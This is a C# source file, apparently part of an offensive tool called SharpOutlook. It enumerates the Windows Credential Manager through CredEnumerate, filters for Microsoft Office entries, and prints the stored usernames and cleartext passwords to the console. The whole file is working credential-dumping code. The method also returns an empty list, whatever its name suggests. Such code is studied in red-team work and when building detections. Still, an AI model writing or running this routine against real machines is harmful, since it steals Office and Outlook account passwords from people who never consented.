using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using SharpOutlook;
using static SharpOutlook.NativeMethods;
using static SharpOutlook.NativeMethods.Credential;

public static class CredMgr
{
    public static Credential ReadCredential(CREDENTIALA credential)
    {
        try
        {
            string appName = Marshal.PtrToStringUni(credential.TargetName);
            string userName = Marshal.PtrToStringUni(credential.UserName);
            string password = null;
            if (credential.CredentialBlob != IntPtr.Zero)
            {
                password = Marshal.PtrToStringUni(credential.CredentialBlob, (int)credential.CredentialBlobSize / 2);
            }
            return new Credential(credential.Type, appName, userName, password, credential.Persist);
        }
        catch
        {
            Logger.Print(Logger.STATUS.ERROR, Logger.GetLastWindowsError());
            return null;
        }
    }

    public static List<Credential> EnumerateCrendentials()
    {
        List<Credential> result = new List<Credential>();

        bool gotCreds = CredEnumerate(null, 0, out int count, out IntPtr pCredentials);
        if (gotCreds)
        {
            for (int n = 0; n < count; n++)
            {
                IntPtr credential = Marshal.ReadIntPtr(pCredentials, n * Marshal.SizeOf(typeof(IntPtr)));
                CREDENTIALA marshaledCred = (CREDENTIALA)Marshal.PtrToStructure(credential, typeof(CREDENTIALA));
                Credential cred = ReadCredential(marshaledCred);
                if(cred == null) { continue;  }
                string username = cred.UserName;
                string password = cred.Password;
                string app = cred.ApplicationName;
                CredentialPersistence persistence = cred.Persistence;
                if (!app.ToLower().Contains("microsoftoffice")) { continue;  }
                Logger.Print(Logger.STATUS.GOOD, app);
                if (username == null && app.Contains("@"))
                {
                    try
                    {
                        username = app.Split(':')[2].Split('@')[0];
                    }
                    catch
                    {
                    }
                }

                if (username != "" || password != "")
                {
                    Logger.Print(Logger.STATUS.INFO, "Username: " + username);
                    Logger.Print(Logger.STATUS.INFO, "Password: " + password);
                    Logger.Print(Logger.STATUS.INFO, "Persistence: " + persistence);
                    Console.WriteLine();
                }
            }
        }
        else
        {
            Logger.Print(Logger.STATUS.ERROR, Logger.GetLastWindowsError());
            return null;
        }

        return result;
    }
}
